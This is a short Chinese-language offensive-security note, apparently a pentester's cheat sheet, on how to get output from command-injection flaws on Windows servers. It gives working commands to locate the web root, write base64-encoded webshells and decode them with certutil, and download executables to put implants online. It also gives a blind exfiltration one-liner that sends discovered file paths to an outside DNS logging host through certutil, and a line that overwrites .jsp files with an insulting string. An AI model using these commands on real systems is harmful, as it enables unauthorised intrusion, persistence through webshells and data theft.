# 命令执行回显探究


# 判断目标操作系统

windows和linux系统下的ping命令参数不同，windows用-n，linux用-c

所以可以在burp当中用`ping -n 3`来判断

如果是windows系统则会产生相应延时，反之则是linux系统





# windows下的命令执行

## 有回显并且出网

### 1.显示路径

可以选择一些特殊文件比如`ms-el-form.umd.js`，然后搭配下面的指令来显示路径

![image-20240104202100801](../../../../img/image-20240104202100801.png)

```
dir /s /a-d /b ms-el-form.umd.js
```

![image-20240104203743837](../../../../img/image-20240104203743837.png)

知道了路径就可以往网站目录写webshell了，写的时候需要注意转义

### 2.远程下载

调用远程下载的命令来把webshell下载到网站目录、下载exe上线



## 有回显不出网

### 1.显示路径

```
dir /s /a-d /b ms-el-form.umd.js
for /r c: %i in (ms-el-form.umd.js*) do @echo %i
```



echo写入base64编码的webshell，然后用certutil解码



## 无回显出网

写入webshell或者远程下载exe

找个特殊的文件，可以盲打，将结果输出到新建文件然后读取

```
for /r C:\  %i  in  (20230726070752*.jsp) do @echo caonimalzf' > %i.jsp
```



知道了路径就可以

```
for /r c: %i in (ms-el-form.umd*.js) do certutil -urlcache -split -f http:690516bc1c.ipv6.1433.eu.org.%i
```



690516bc1c.ipv6.1433.eu.org.

https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483888&idx=1&sn=1b27699118e73565fa62aa73ab8fcbd8&chksm=c2a1d579f5d65c6ff6292013a5f272ccd27b940ef8efc790055259b97a85fb6b8992c9bcf435&mpshare=1&scene=1&srcid=0208XTmwC6NG4aBm5epId8as&sharer_sharetime=1644311126317&sharer_shareid=364b318b59e17770cdf42d79a4539355&version=4.0.0.6007&platform=win#rd



https://cn-sec.com/archives/1129108.html



https://lmcmc.github.io/2020/11/28/RCE%E4%B9%8B%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE/

